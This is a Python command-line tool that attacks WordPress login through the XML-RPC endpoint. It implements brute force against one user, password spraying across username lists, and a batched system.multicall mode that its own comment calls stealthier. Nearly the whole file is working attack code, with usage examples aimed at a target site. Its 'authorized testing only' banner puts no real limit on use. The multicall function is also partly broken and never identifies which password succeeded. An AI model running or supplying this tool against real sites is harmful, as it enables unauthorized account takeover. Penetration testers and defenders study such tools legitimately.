#!/usr/bin/env python3
"""
XML-RPC WordPress Authentication Testing Tool
Author: Security Research Tool
Purpose: Testing XML-RPC endpoints for authentication vulnerabilities
"""

import requests
import argparse
import sys
from typing import List, Dict, Optional, Tuple
from xml.etree import ElementTree as ET
import urllib3
import time
from datetime import datetime
import threading
from queue import Queue

# Suppress SSL warnings for testing environments
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    """ANSI color codes for terminal output"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class XMLRPCPasswordChecker:
    def __init__(self, target_url: str, verify_ssl: bool = True, 
                 proxy: Optional[Dict] = None, delay: float = 0):
        """
        Initialize the XML-RPC password checker
        
        Args:
            target_url: Base URL of WordPress site
            verify_ssl: Whether to verify SSL certificates
            proxy: Optional proxy configuration
            delay: Delay between requests in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.xmlrpc_endpoint = f"{self.target_url}/xmlrpc.php"
        self.verify_ssl = verify_ssl
        self.proxy = proxy
        self.delay = delay
        self.session = requests.Session()
        self.found_credentials = []
        self.lock = threading.Lock()
        
    def check_xmlrpc_enabled(self) -> bool:
        """Check if XML-RPC is enabled on the target"""
        try:
            response = self.session.get(
                self.xmlrpc_endpoint,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=10
            )
            
            if response.status_code == 200 and 'XML-RPC' in response.text:
                print(f"{Colors.GREEN}[+]{Colors.RESET} XML-RPC endpoint is accessible at {self.xmlrpc_endpoint}")
                return True
            else:
                print(f"{Colors.RED}[-]{Colors.RESET} XML-RPC does not appear to be enabled")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error checking XML-RPC: {e}")
            return False
    
    def test_authentication(self, username: str, password: str, verbose: bool = False) -> Tuple[bool, str]:
        """
        Test a username/password combination
        
        Args:
            username: Username to test
            password: Password to test
            verbose: Print detailed responses
            
        Returns:
            Tuple of (success, response_message)
        """
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""
        
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': 'Mozilla/5.0 (Security Research Tool)'
        }
        
        try:
            response = self.session.post(
                self.xmlrpc_endpoint,
                data=payload,
                headers=headers,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=15
            )
            
            # Successful authentication
            if response.status_code == 200 and '<methodResponse>' in response.text:
                if 'isAdmin' in response.text or 'blogName' in response.text:
                    return True, "Authentication successful"
                elif 'faultCode' in response.text:
                    try:
                        root = ET.fromstring(response.text)
                        fault_code = root.find('.//faultCode').text
                        fault_string = root.find('.//faultString').text
                        
                        if verbose:
                            print(f"{Colors.YELLOW}[?]{Colors.RESET} FaultCode: {fault_code}, Message: {fault_string}")
                        
                        # Check for various error messages
                        if 'incorrect password' in fault_string.lower():
                            return False, "Incorrect password (user exists)"
                        elif 'invalid username' in fault_string.lower():
                            return False, "Invalid username (user does not exist)"
                        else:
                            return False, fault_string
                    except Exception as e:
                        if verbose:
                            print(f"{Colors.YELLOW}[?]{Colors.RESET} Error parsing response: {e}")
                        return False, "Unknown error in response"
            
            return False, f"Unexpected response (HTTP {response.status_code})"
                
        except requests.exceptions.Timeout:
            return False, "Request timeout"
        except requests.exceptions.RequestException as e:
            return False, f"Request error: {str(e)}"
    
    def test_single_password(self, username: str, password: str) -> bool:
        """
        Test a single username/password combination
        
        Args:
            username: Username to test
            password: Password to test
            
        Returns:
            True if credentials are valid
        """
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Testing credentials:")
        print(f"    Username: {username}")
        print(f"    Password: {password}")
        
        success, message = self.test_authentication(username, password, verbose=True)
        
        if success:
            print(f"{Colors.GREEN}{Colors.BOLD}[+] SUCCESS!{Colors.RESET} Valid credentials found!")
            print(f"    {Colors.GREEN}Username: {username}{Colors.RESET}")
            print(f"    {Colors.GREEN}Password: {password}{Colors.RESET}")
            self.found_credentials.append((username, password))
            return True
        else:
            print(f"{Colors.RED}[-]{Colors.RESET} Authentication failed: {message}")
            return False
    
    def bruteforce_password(self, username: str, password_file: str, 
                           stop_on_success: bool = True) -> List[Tuple[str, str]]:
        """
        Bruteforce passwords for a single user
        
        Args:
            username: Target username
            password_file: Path to password wordlist
            stop_on_success: Stop after finding first valid password
            
        Returns:
            List of valid (username, password) tuples
        """
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!]{Colors.RESET} Password file not found: {password_file}")
            return []
        except Exception as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Error reading password file: {e}")
            return []
        
        total = len(passwords)
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Starting password bruteforce")
        print(f"    Target: {username}")
        print(f"    Passwords to test: {total}")
        print(f"    Delay: {self.delay}s between attempts")
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Press Ctrl+C to stop\n")
        
        start_time = datetime.now()
        
        for i, password in enumerate(passwords, 1):
            if i % 100 == 0 or i == 1:
                elapsed = (datetime.now() - start_time).total_seconds()
                rate = i / elapsed if elapsed > 0 else 0
                print(f"{Colors.BLUE}[*]{Colors.RESET} Progress: {i}/{total} ({(i/total)*100:.1f}%) - Rate: {rate:.1f} req/s")
            
            success, message = self.test_authentication(username, password)
            
            if success:
                print(f"\n{Colors.GREEN}{Colors.BOLD}[+] VALID CREDENTIALS FOUND!{Colors.RESET}")
                print(f"    {Colors.GREEN}Username: {username}{Colors.RESET}")
                print(f"    {Colors.GREEN}Password: {password}{Colors.RESET}")
                print(f"    Attempt: {i}/{total}")
                
                self.found_credentials.append((username, password))
                
                if stop_on_success:
                    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Stopping on first success (use --continue to find all)")
                    break
            
            # Rate limiting
            if self.delay > 0:
                time.sleep(self.delay)
        
        elapsed_time = (datetime.now() - start_time).total_seconds()
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Attack completed in {elapsed_time:.2f} seconds")
        
        return self.found_credentials
    
    def spray_passwords(self, user_file: str, password_file: str, 
                       stop_on_success: bool = False) -> List[Tuple[str, str]]:
        """
        Password spray attack - test multiple users with passwords
        
        Args:
            user_file: Path to username wordlist
            password_file: Path to password wordlist
            stop_on_success: Stop after finding first valid credential
            
        Returns:
            List of valid (username, password) tuples
        """
        try:
            with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!]{Colors.RESET} User file not found: {user_file}")
            return []
        
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!]{Colors.RESET} Password file not found: {password_file}")
            return []
        
        total_attempts = len(usernames) * len(passwords)
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Starting password spray attack")
        print(f"    Users: {len(usernames)}")
        print(f"    Passwords: {len(passwords)}")
        print(f"    Total attempts: {total_attempts}")
        print(f"    Delay: {self.delay}s between attempts")
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Press Ctrl+C to stop\n")
        
        start_time = datetime.now()
        attempt = 0
        
        # Password spray: try each password against all users before moving to next password
        for password in passwords:
            print(f"{Colors.BLUE}[*]{Colors.RESET} Testing password: {password[:20]}{'...' if len(password) > 20 else ''}")
            
            for username in usernames:
                attempt += 1
                
                if attempt % 50 == 0:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    rate = attempt / elapsed if elapsed > 0 else 0
                    print(f"{Colors.BLUE}[*]{Colors.RESET} Progress: {attempt}/{total_attempts} ({(attempt/total_attempts)*100:.1f}%) - Rate: {rate:.1f} req/s")
                
                success, message = self.test_authentication(username, password)
                
                if success:
                    print(f"\n{Colors.GREEN}{Colors.BOLD}[+] VALID CREDENTIALS FOUND!{Colors.RESET}")
                    print(f"    {Colors.GREEN}Username: {username}{Colors.RESET}")
                    print(f"    {Colors.GREEN}Password: {password}{Colors.RESET}")
                    print(f"    Attempt: {attempt}/{total_attempts}\n")
                    
                    self.found_credentials.append((username, password))
                    
                    if stop_on_success:
                        print(f"{Colors.YELLOW}[*]{Colors.RESET} Stopping on first success")
                        elapsed_time = (datetime.now() - start_time).total_seconds()
                        print(f"{Colors.CYAN}[*]{Colors.RESET} Attack completed in {elapsed_time:.2f} seconds")
                        return self.found_credentials
                
                if self.delay > 0:
                    time.sleep(self.delay)
        
        elapsed_time = (datetime.now() - start_time).total_seconds()
        print(f"\n{Colors.CYAN}[*]{Colors.RESET} Attack completed in {elapsed_time:.2f} seconds")
        
        return self.found_credentials
    
    def multicall_attack(self, username: str, passwords: List[str]) -> Optional[str]:
        """
        Use system.multicall to test multiple passwords in one request
        This is more stealthy and faster but may be blocked
        
        Args:
            username: Target username
            passwords: List of passwords to test
            
        Returns:
            Valid password if found, None otherwise
        """
        print(f"{Colors.CYAN}[*]{Colors.RESET} Attempting multicall attack (testing {len(passwords)} passwords in one request)")
        
        # Build multicall payload
        method_calls = ""
        for password in passwords:
            method_calls += f"""
    <param>
      <value>
        <struct>
          <member>
            <name>methodName</name>
            <value><string>wp.getUsersBlogs</string></value>
          </member>
          <member>
            <name>params</name>
            <value>
              <array>
                <data>
                  <value><string>{username}</string></value>
                  <value><string>{password}</string></value>
                </data>
              </array>
            </value>
          </member>
        </struct>
      </value>
    </param>"""
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>{method_calls}
  </params>
</methodCall>"""
        
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': 'Mozilla/5.0 (Security Research Tool)'
        }
        
        try:
            response = self.session.post(
                self.xmlrpc_endpoint,
                data=payload,
                headers=headers,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=30
            )
            
            if response.status_code == 200:
                # Parse response to find successful authentication
                for i, password in enumerate(passwords):
                    if 'isAdmin' in response.text or 'blogName' in response.text:
                        # Try to correlate which password worked
                        print(f"{Colors.GREEN}[+]{Colors.RESET} Multicall successful - valid password may be in the batch")
                        # Individual testing would be needed to confirm
                        return None
                
            print(f"{Colors.YELLOW}[-]{Colors.RESET} Multicall did not reveal valid credentials")
            return None
            
        except Exception as e:
            print(f"{Colors.RED}[!]{Colors.RESET} Multicall error: {e}")
            return None


def main():
    parser = argparse.ArgumentParser(
        description='XML-RPC WordPress Password Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test single password
  python3 xmlrpc_auth.py -u https://target.com --username david --password Password123
  
  # Bruteforce single user
  python3 xmlrpc_auth.py -u https://target.com --username david -p passwords.txt
  
  # Password spray attack
  python3 xmlrpc_auth.py -u https://target.com --user-file users.txt -p passwords.txt --spray
  
  # With delay and proxy
  python3 xmlrpc_auth.py -u https://target.com --username david -p passwords.txt --delay 2 --proxy http://127.0.0.1:8080
  
  # Continue after finding valid credentials
  python3 xmlrpc_auth.py -u https://target.com --username admin -p passwords.txt --continue
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target WordPress URL')
    parser.add_argument('--username', help='Single username to test')
    parser.add_argument('--password', help='Single password to test')
    parser.add_argument('--user-file', help='File containing usernames (one per line)')
    parser.add_argument('-p', '--password-file', help='File containing passwords (one per line)')
    parser.add_argument('--spray', action='store_true', help='Password spray mode (requires --user-file and --password-file)')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    parser.add_argument('--continue', dest='continue_on_success', action='store_true', 
                       help='Continue testing after finding valid credentials')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Banner
    print(f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════╗
║   XML-RPC WordPress Password Testing Tool        ║
║   For Authorized Security Testing Only           ║
╚═══════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    # Validate arguments
    if args.spray and (not args.user_file or not args.password_file):
        print(f"{Colors.RED}[!]{Colors.RESET} Password spray mode requires both --user-file and --password-file")
        sys.exit(1)
    
    if not args.spray and not args.username and not args.user_file:
        print(f"{Colors.RED}[!]{Colors.RESET} Must specify --username or --user-file")
        sys.exit(1)
    
    # Setup proxy if provided
    proxy_config = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    
    # Initialize checker
    checker = XMLRPCPasswordChecker(
        target_url=args.url,
        verify_ssl=not args.no_ssl_verify,
        proxy=proxy_config,
        delay=args.delay
    )
    
    # Check if XML-RPC is enabled
    if not checker.check_xmlrpc_enabled():
        print(f"{Colors.RED}[!]{Colors.RESET} XML-RPC appears to be disabled. Exiting.")
        sys.exit(1)
    
    try:
        # Single password test
        if args.username and args.password:
            checker.test_single_password(args.username, args.password)
        
        # Bruteforce single user
        elif args.username and args.password_file:
            checker.bruteforce_password(
                args.username, 
                args.password_file,
                stop_on_success=not args.continue_on_success
            )
        
        # Password spray attack
        elif args.spray:
            checker.spray_passwords(
                args.user_file,
                args.password_file,
                stop_on_success=not args.continue_on_success
            )
        
        # Display results
        if checker.found_credentials:
            print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*50}")
            print(f"[+] VALID CREDENTIALS FOUND: {len(checker.found_credentials)}")
            print(f"{'='*50}{Colors.RESET}\n")
            for username, password in checker.found_credentials:
                print(f"{Colors.GREEN}Username: {username}")
                print(f"Password: {password}{Colors.RESET}\n")
        else:
            print(f"\n{Colors.YELLOW}[*]{Colors.RESET} No valid credentials found")
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!]{Colors.RESET} Attack interrupted by user")
        if checker.found_credentials:
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} Credentials found before interruption:")
            for username, password in checker.found_credentials:
                print(f"    {username}:{password}")
        sys.exit(0)


if __name__ == "__main__":
    main()
